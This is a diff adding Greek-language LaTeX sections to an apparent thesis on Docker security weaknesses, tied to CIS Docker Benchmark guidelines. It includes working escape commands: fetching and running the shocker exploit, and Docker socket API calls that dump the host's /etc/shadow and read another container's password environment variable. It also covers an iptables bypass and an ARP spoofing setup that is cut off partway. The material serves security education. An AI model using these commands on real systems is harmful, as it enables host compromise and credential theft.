@@ -421,8 +421,344 @@
 
 \subsubsection{\texttt{\textlatin{CAP\_DAC\_READ\_SEARCH}}}
 
+Πριν το \textlatin{Docker} 1.0.0 το \textlatin{CAP\_DAC\_READ\_SEARCH}
+προστέθηκε στις προεπιλεγμένες δυνατότητες που παρέχονται σε ένα κοντέινερ.
+Αλλά αυτή η ικανότητα επιτρέπει σε μια διαδικασία να ξεφύγει από ένα κοντέινερ
+\cite{Docker-Shocker-Seclists}. Μια διαδικασία με
+\textlatin{CAP\_DAC\_READ\_SEARCH} είναι είναι σε θέση να κάνει
+\textlatin{bruteforce} το εσωτερικό ευρετήριο (\textlatin{internal index}) των
+αρχείων εκτός του κοντέινερ. Ως απόδειξη της εκμετάλλευσης της συγκεκριμένης
+επίθεσης, δημοσιοποιήθηκε ένα \textlatin{Proof of concept} \cite{Docker-Shocker}
+\cite{Docker-Shocker-Analysis}. Αυτό το \textlatin{exploit} κυκλοφόρησε το 2014,
+αλλά εξακολουθεί να λειτουργεί σε κοντέινερ με την ικανότητα
+\textlatin{CAP\_DAC\_READ\_SEARCH}. \\
+
+\texttt{\textlatin{(host)\$ curl -o /tmp/shocker.c http://stealth.openwall.net/xSports/shocker.c}}
+
+\texttt{\textlatin{(host)\$ sed -i "s/\textbackslash /.dockerinit/\textbackslash /tmp\textbackslash /a.out/" shocker.c}}
+
+\texttt{\textlatin{(host)\$ cc -Wall -std=c99 -O2 shocker.c -static}}
+
+\texttt{\textlatin{(host)\$ docker run --rm -it --cap-add=CAP\_DAC\_READ\_SEARCH -v /tmp:/tmp busybox sh}}
+
+\texttt{\textlatin{(cont)\# /tmp/a.out}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{[!] Win! /etc/shadow output follows:}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\
+
+Το \textlatin{exploit} χρειάζεται ένα αρχείο με χειρισμό αρχείου στο κεντρικό
+σύστημα για να πετύχει. Αντί για το προεπιλεγμένο
+\texttt{\textlatin{/.dockerinit}} (το οποίο δεν δημιουργείται πλέον σε
+νεότερες εκδόσεις του \textlatin{Docker}) χρησιμοποιούμε το ίδιο το αρχείο
+\textlatin{exploit /tmp/a.out}. Αρχίζουμε ένα κοντέινερ με την ικανότητα
+\texttt{\textlatin{CAP\_DAC\_READ\_SEARCH}} και εκτελούμε το \textlatin{exploit}.
+Παρατηρούμε ότι εκτυπώνει το αρχείο κωδικού πρόσβασης του κεντρικού υπολογιστή
+(π.χ. \textlatin{/etc/shadow}).
+
 \subsection{\textlatin{Docker Socket}}
 
+Το \textlatin{Docker Socket} (δηλαδή \texttt{\textlatin{/var/run/docker.sock}})
+είναι ο τρόπος με τον οποίο οι \textlatin{clients} επικοινωνούν με το
+\textlatin{Docker daemon}. Κάθε φορά που ένας χρήστης εκτελεί μια
+\textlatin{Docker client} εντολή, ο \textlatin{Docker client} στέλνει ένα
+αίτημα \textlatin{HTTP} στο \textlatin{docker socket}.
+
+Δεν χρειάζεται να χρησιμοποιήσουμε το \textlatin{Docker client}, αλλά μπορούμε
+να στείλουμε αιτήματα \textlatin{HTTP} στο \textlatin{socket} απευθείας. Αυτό
+το βλέπουμε στην παρακάτω λίστα, η οποία εμφανίζει δύο εντολές
+(για την εμφάνιση όλων των κοντέινερ) που παράγουν την ίδια έξοδο (αν και σε
+διαφορετική μορφή). Η πρώτη εντολή χρησιμοποιεί τον \textlatin{Docker client}
+και η δεύτερη εντολή στέλνει ένα αίτημα \textlatin{HTTP} απευθείας.
+
+\texttt{\textlatin{(host)\$ docker ps -a}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(host)\$ curl --unix-socket /var/run/docker.sock -H 'ContentType: application/json' "http://localhost/containers/json?all=1"}}
+
+\texttt{\textlatin{...}}
+
+Το \textlatin{Docker Socket} καλύπτεται από τις κατευθυντήριες γραμμές 3.15 του
+\textlatin{CIS Docker Benchmark}
+(Βεβαιωθείτε ότι η ιδιοκτησία του αρχείου \textlatin{Docker Socket} έχει
+οριστεί σε \texttt{\textlatin{root:docker}}) και 3.16 (Βεβαιωθείτε ότι τα
+δικαιώματα αρχείου \textlatin{Docker Socket} έχουν οριστεί σε 660 ή περισσότερο
+περιοριστικά).
+
+Σε αυτή την ενότητα θα εξετάσουμε τους πολλούς τρόπους για να ρυθμίσει κανείς
+εσφαλμένα το \textlatin{Docker Socket} και τους κινδύνους
+\cite{The-Dangers-Of-Docker-Sock} που συνεπάγεται αυτό.
+
+\subsubsection{Διαφυγές κοντέινερ μέσα από \textlatin{Docker Socket}}
+
+Παροχή πρόσβασης κοντέινερ στο \textlatin{API} (προσαρτώντας τo
+\textlatin{socket} ως \textlatin{volume}) είναι μια κοινή πρακτική, επειδή
+επιτρέπει στα κοντέινερ να παρακολουθούν και να αναλύουν
+άλλα κοντέινερ. Εάν το \texttt{\textlatin{/var/run/docker.sock}} έχε
+προσαρτηθεί ως \textlatin{volume} σε ένα κοντέινερ, το κοντέινερ έχει πρόσβαση
+στο \textlatin{API} (ακόμα κι αν είναι το \textlatin{socket} τοποθετημένο ως
+\textlatin{volume} μόνο για ανάγνωση \cite{The-Dangers-Of-Docker-Sock}
+\cite{Read-Only-Docker-Socket-Tweet} \cite{Read-Only-Docker-Socket-Hackernews}).
+Αυτό σημαίνει ότι η διαδικασία μέσα στο κοντέινερ έχει πλήρη πρόσβαση στο
+\textlatin{Docker} στον κεντρικό υπολογιστή. Αυτό μπορεί να χρησιμοποιηθεί για
+να διαφύγει κανείς από το κοντέινερ, επειδή το κοντέινερ μπορεί να δημιουργήσει
+ένα άλλο κοντέινερ με αυθαίρετα \textlatin{volumes} και εντολές. Είναι ακόμη
+δυνατό να δημιουργηθεί ένα \textlatin{interactive shell} μέσα άλλα κοντέινερς
+\cite{Escape-Socket-Shell}.
+
+Ας υποθέσουμε ότι θέλουμε να βρούμε τον κατακερματισμό κωδικού πρόσβασης ενός
+χρήστη που ονομάζεται διαχειριστής στον κεντρικό υπολογιστή. Μπορούμε να
+εκτελέσουμε εντολές σε ένα κοντέινερ με
+\texttt{\textlatin{/var/run/docker.sock}} προσαρτημένο ως \textlatin{volume}.
+Χρησιμοποιούμε το \textlatin{API} για να ξεκινήσουμε ένα άλλο \textlatin{Docker}
+κοντέινερ (στον κεντρικό υπολογιστή), που έχει πρόσβαση στον κατακερματισμό
+κωδικό πρόσβασης (που βρίσκεται στο \texttt{\textlatin{/etc/shadow}}).
+Διαβάζουμε το αρχείο κωδικών πρόσβασης, αναλύοντας τα αρχεία καταγραφής
+(\textlatin{logs}) του κοντέινερ που έχουμε μόλις δημιουργήσει. \\
+
+\texttt{\textlatin{(host)\$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash}}
+
+\texttt{\textlatin{(cont)\# curl -XPOST -H "Content-Type: application/json" --unix -socket /var/run/docker.sock -d '\{"Image":"ubuntu:latest"," Cmd":["cat", "/host/etc/shadow"],"Mounts":[\{"Type":"bind"," Source":"/","Target":"/host"\}]\}' "http://localhost/containers/create?name=escape"}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# curl -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/escape/start"}}
+
+\texttt{\textlatin{(cont)\# curl --output - --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=true"}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# curl -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/escape"}} \\
+
+Αυτό καλύπτεται από την κατευθυντήρια γραμμή 5.31 του
+\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι το \textlatin{Docker socket}
+δεν είναι τοποθετημένη μέσα σε κανένα κοντέινερ).
+
+\subsubsection{Ευαίσθητες πληροφορίες}
+
+Όταν ένα κοντέινερ έχει πρόσβαση στο \texttt{\textlatin{/var/run/docker.sock}}
+(δηλαδή όταν \texttt{\textlatin{/var/run/docker.sock}} προστίθεται ως
+\textlatin{volume} μέσα στο κοντέινερ), μπορεί όχι απλά να ξεκινήσει
+νέα κοντέινερ αλλά μπορεί επίσης να διαβάσει το \textlatin{configuration} των
+υπαρχόντων κοντέινερ. Το \textlatin{configuration} ενδέχεται να περιέχει
+ευαίσθητες πληροφορίες (π.χ. κωδικούς πρόσβασης σε μεταβλητές περιβάλλοντος).
+
+Ας ξεκινήσουμε μια βάση δεδομένων \textlatin{Postgres}
+\footnote{\textlatin{https://www.postgresql.org/}} μέσω \textlatin{Docker}.
+Από την τεκμηρίωση της εικόνας Postgres Docker
+\footnote{\textlatin{https://hub.docker.com/\_/postgres}}, γνωρίζουμε ότι
+μπορούμε να παρέχουμε έναν κωδικό πρόσβασης χρησιμοποιώντας τη μεταβλητή
+περιβάλλοντος \textlatin{POSTGRES\_PASSWORD}. Αν έχουμε πρόσβαση σε
+ένα άλλο κοντέινερ που έχει πρόσβαση στο \textlatin{Docker API}, μπορούμε να
+διαβάσουμε τον κωδικό πρόσβασης από τη μεταβλητή περιβάλλοντος. \\
+
+\texttt{\textlatin{(host)\$ docker run --name database -e POSTGRES\_PASSWORD=secret -d postgres}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(host)\$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock:ro ubuntu:latest bash}}
+
+\texttt{\textlatin{(cont)\# apt update}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# apt install curl jq}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# curl --unix-socket /var/run/docker.sock -H 'ContentType: application/json' "http://localhost/containers/database/json" | jq -r '.Config.Env'}}
+
+\texttt{\textlatin{[}}
+
+\texttt{\textlatin{"POSTGRES\_PASSWORD=secret",}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{]}}\\
+
+Αυτό καλύπτεται επίσης από την κατευθυντήρια γραμμή 5.31 του
+\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι η το \textlatin{Docker socket}
+δεν είναι τοποθετημένο μέσα σε κανένα κοντέινερ).
+
+\subsubsection{Απομακρυνσμένη Πρόσβαση}
+
+Είναι επίσης δυνατό να κάνουμε το \textlatin{Docker API} να ακούει σε μια θύρα
+\textlatin{TCP}. Οι θύρες 2375 και 2376 χρησιμοποιούνται συνήθως για επικοινωνία
+\textlatin{HTTP} και \textlatin{HTTPS} του \textlatin{Docker API}, αντίστοιχα.
+Αυτό, ωστόσο, φέρνει όλη την επιπλέον πολυπλοκότητα που έχουν τα
+\textlatin{TCP sockets}. Εάν δεν έχει ρυθμιστεί να "ακούει" μόνο σε
+\textlatin{localhost}, τότε, αυτό δίνει σε κάθε κεντρικός υπολογιστή στο δίκτυο
+πρόσβαση στο \textlatin{Docker}. Εάν ο κεντρικός υπολογιστής είναι άμεσα
+προσβάσιμος μέσω του διαδικτύου, τότε, δίνει σε όλους πρόσβαση σε όλες τις
+δυνατότητες του \textlatin{Docker} στον κεντρικό υπολογιστή. Ένας επιτιθέμενος
+θα μπορούσε να εκμεταλλευτεί αυτήν την εσφαλμένη ρύθμιση ξεκινώντας άλλα
+κοντέινερς που θα μπορούσαν να οδηγήσουν σε περαιτέρω πρόσβαση σε άλλα κοντέινερ
+και των υποκείμενες υποδομών τους \cite{Metasploit-Unprotected-TCP-Socket}.
+
+Ένας κακόβουλος χρήστης εκμεταλλέυτηκε αυτό το χαρακτηριστικό τον Μάιο του 2019.
+Χρησιμοποίησε το \textlatin{Shodan}
+\footnote{\textlatin{https://www.shodan.io/}} προκειμένου να βρεί μη
+προστατευμένα δημόσια προσβάσιμα \textlatin{Docker APIs} και να ξεκινήσει
+κοντέινερ με σκοπό εξόρυξη κρυπτονομισμάτων (\textlatin{Monero}
+\footnote{\textlatin{https://www.getmonero.org/}}) και προκειμένου να βρεί
+άλλους ξενιστές για να μολύνει \cite{zoolu2-bot-1807} \cite{zoolu2-bot-1809}
+\cite{zoolu2-bot-1853}.
+
+Καμία οδηγία \textlatin{CIS Docker Benchmark} δεν καλύπτει τη περίπτωση του
+να είναι το \textlatin{Docker API} προσβάσιμο μέσω \textlatin{TCP}.
+
+\subsection{Παράκαμψη \texttt{\textlatin{iptables}}}
+
+Ο πυρήνας του \textlatin{Linux} έχει ένα ενσωματωμένο \textlatin{firewall}, που
+ονομάζεται \textlatin{Netfilter} το οποίο μπορεί να ρυθμιστεί με ένα πρόγραμμα
+που ονομάζεται \texttt{\textlatin{iptables}}. Αυτό το \textlatin{firewall}
+αποτελείται από πολλές αλυσίδες κανόνων που αποθηκεύονται σε πίνακες. Κάθε
+πίνακας έχει διαφορετικό σκοπό.
+Για παράδειγμα, υπάρχει ένας πίνακας \textlatin{nat} για μετάφραση διευθύνσεων
+και ένας πίνακας φίλτρων για φιλτράρισμα κίνησης (το οποίο είναι το
+προεπιλεγμένο). Κάθε πίνακας έχει διατεταγμένες αλυσίδες (\textlatin{chains of
+ordered rules})
+κανόνων που έχουν επίσης διαφορετικό σκοπό. Για παράδειγμα, υπάρχουν τα
+\textlatin{OUTPUT} και αλυσίδες \textlatin{INPUT} στον πίνακα φίλτρων που
+προορίζονται για όλη την εξερχόμενη και
+εισερχόμενη κίνηση, αντίστοιχα. Είναι δυνατό να διαμορφώουμε αυτούς τους κανόνες
+χρησιμοποιώντας ένα πρόγραμμα που ονομάζεται \textlatin{iptables}. Όλα τα τείχη
+προστασίας που βασίζονται στο \textlatin{Linux} (π.χ. \textlatin{ufw})
+χρησιμοποιούν \textlatin{iptables} ως \textlatin{backend}.
+
+Όταν ξεκινά ο \textlatin{Docker Daemon}, δημιουργεί τις δικές του αλυσίδες και
+κανόνων για τη δημιουργία απομονωμένων δικτύων. Ο τρόπος που θέτει τους κανόνες
+του παρακάμπτει εντελώς άλλους κανόνες στο τείχος προστασίας (επειδή έχουν
+ρυθμιστεί πριν από τους άλλους κανόνες) και από προεπιλογή οι κανόνες είναι
+αρκετά ανεκτικοί. Αυτό είναι \textlatin{by design}, επειδή το δικτυακό
+\textlatin{stack} κεντρικού υπολογιστή και του κοντέινερ είναι ξεχωριστά,
+συμπεριλαμβανομένων των κανόνων του τείχους προστασίας. Οι χρήστες του
+\textlatin{Docker} μπορεί να έχουν την εντύπωση ότι οι κανόνες του τείχους
+προστασίας που ορίζονται από το κεντρικό υπολογιστή ισχύουν για οτιδήποτε τρέχει
+στον σε αυτόν (συμπεριλαμβανομένων των κοντέινερ). Αυτό δεν ισχύει για τα
+\textlatin{Docker} κοντέινερ και θα μπορούσε να οδηγήσει σε εκτεθειμένες πόρτες
+(\textlatin{ports}).
+
+Είναι, ωστόσο, λίγο αντιφατικό, γιατί θα υποθέταμε ότι αν α
+ένας κανόνας του τείχους προστασίας έχει οριστεί στον κεντρικό υπολογιστή, θα
+ίσχυε για οτιδήποτε τρέχει σε αυτόν (συμπεριλαμβανομένων των κοντέινερ).
+
+Θα εξετάσουμε το ακόλουθο παράδειγμα παράκαμψης ενός κανόνα τείχους προστασίας
+με \textlatin{Docker}. \\
+
+\texttt{\textlatin{(host)\# iptables -A OUTPUT -p tcp --dport 80 -j DROP}}
+
+\texttt{\textlatin{(host)\# iptables -A FORWARD -p tcp --dport 80 -j DROP}}
+
+\texttt{\textlatin{(host)\$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock:ro ubuntu:latest bash}}
+
+\texttt{\textlatin{(host)\$ curl http://httpbin.org/get}}
+
+\texttt{\textlatin{curl: (7) Failed to connect to httpbin.org port 80: Connection timed out}}
+
+\texttt{\textlatin{(host)\$ docker run -it --rm ubuntu /bin/bash}}
+
+\texttt{\textlatin{(cont)\# apt update}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# apt install curl}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# curl http://httpbin.org/get}}
+
+\texttt{\textlatin{\{}}
+
+\texttt{\textlatin{"args": \{\}}}
+
+\texttt{\textlatin{"headers": \{}}
+
+\texttt{\textlatin{"Accept": "*/*",}}
+
+\texttt{\textlatin{"Host": "httpbin.org",}}
+
+\texttt{\textlatin{"User-Agent": "curl/7.58.0"}}
+
+\texttt{\textlatin{\},}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{"url": "https://httpbin.org/get"}}
+
+\texttt{\textlatin{\}}} \\
+
+
+Στην παραπάνω λίστα ρυθμίζουμε πρώτα κανόνες για να απορρίψουμε όλη την
+εξερχόμενη (συμπεριλαμβανομένης της προωθούμενης) κίνησης στη θύρα 80 (την
+τυπική θύρα \textlatin{HTTP}). Στη συνέχεια, προσπαθούμε να ζητήσουμε
+μια ιστοσελίδα (\textlatin{http://httpbin.org/get}) στον κεντρικό υπολογιστή.
+Όπως ήταν αναμενόμενο, η υπηρεσία \textlatin{HTTP} δεν είναι προσβάσιμη για
+εμάς. Αν στη συνέχεια προσπαθήσουμε να κάνουμε το ίδιο ακριβώς αίτημα
+σε ένα κοντέινερ, λειτουργεί.
+
+Το \textlatin{CIS Docker Benchmark} δεν καλύπτει αυτό το πρόβλημα. Αυτό, ωστόσο,
+έχει οδηγίες που διασφαλίζουν την ύπαρξη αυτού του προβλήματος. Κατευθυντήρια
+γραμμή 2.3 (Βεβαιωθείτε ότι στο Docker επιτρέπεται να κάνει αλλαγές στα
+\textlatin{iptables}) συνιστά ο \textlatin{Docker daemon} επιτρέπεται να αλλάξει
+τους κανόνες του τείχους προστασίας. Κατευθυντήρια γραμμή 5.9 (Βεβαιωθείτε ότι
+το \textlatin{namespace} του δικτύου του κεντρικού υπολογιστή δεν είναι
+κοινόχρηστος) συνιστά τη μη χρήση του \texttt{\textlatin{--network=host}}
+ορίσματος, για να βεβαιωθείτε ότι το κοντέινερ έχει τοποθετηθεί σε ξεχωριστή
+στοίβα δικτύου.
+
+Αυτές είναι καλές συστάσεις, γιατί ακολουθώντας τες δεν υπάρχει ανάγκη για να
+να διαμορφώσουμε μόνοι μας μια στοίβα δικτύου με κοντέινερ. Ωστόσο, επιπλέον
+απομονώνει τους κανόνες του τείχους προστασίας του κεντρικού υπολογιστή από τα
+κοντέινερ.
+
+\subsection{\textlatin{ARP Spoofing}}
+
+Από προεπιλογή, όλα τα κοντέινερ \textlatin{Docker} προστίθενται στο ίδιο
+γεφυρωμένο δίκτυο (\textlatin{bridged network}). Αυτό σημαίνει ότι μπορούν να
+επικοινωνήσουν ο ένας με τον άλλον. Από προεπιλογή, τα κοντέινερ
+\textlatin{Docker} λαμβάνουν επίσης την ικανότητα
+\texttt{\textlatin{CAP\_NET\_RAW}}, η οποία τους επιτρέπει να δημιουργούν \textlatin{raw}
+πακέτα. Αυτό σημαίνει ότι από προεπιλογή, τα κοντέινερ μπορούν να
+κάνουν \textlatin{ARP Spoof} άλλα κοντέινερς \cite{Abusing-Containers}
+\footnote{Η προώθηση \textlatin{IPv4} είναι ενεργοποιημένη από προεπιλογή στο \textlatin{Docker}}.
+
+Ας ρίξουμε μια ματιά σε ένα πρακτικό παράδειγμα. Ας πούμε ότι έχουμε τρία
+κοντέινερς. Ένα κοντέινερ θα κάνει \textlatin{ping} άλλο κοντέινερ. Ένα τρίτο
+κακόβουλο κοντέινερ θέλει να υποκλέψει τα πακέτα \texttt{\textlatin{ICMP}}
+
+Ξεκινάμε τρία κοντέινερ \textlatin{Docker} χρησιμοποιώντας την εικόνα
+\textlatin{ubuntu:latest}. Εχουν τα ακόλουθα ονόματα, διευθύνσεις
+\textlatin{IPv4} και διευθύνσεις \textlatin{MAC}: \\
+
+\texttt{\textlatin{• victim0: 172.17.0.2}} και \texttt{\textlatin{02:42:ac:11:00:02}}
+
+\texttt{\textlatin{• victim1: 172.17.0.3}} και \texttt{\textlatin{02:42:ac:11:00:03}}
+
+\texttt{\textlatin{• attacker: 172.17.0.4}} και \texttt{\textlatin{02:42:ac:11:00:04}} \\
+
+Συντομεύουμε τα ονόματά τους σε \textlatin{vic0, vic1, attck}, αντίστοιχα, αντί
+για \textlatin{cont} για να υποδείξει σε ποιο κοντέινερ εκτελείται μια εντολή. \\
+
+\texttt{\textlatin{(host)\$ docker run --rm -it --name=victim0 -h victim0 ubuntu:latest /bin/bash}}
+
+\texttt{\textlatin{(vic0)\# apt update}}
+
+\texttt{\textlatin{...}}
+
+
+\texttt{\textlatin{(vic0)\# apt install net-tools iproute2 iputils-ping}}
+
+\texttt{\textlatin{...}}
 
 
 \section{Σφάλματα Λογισμικού}
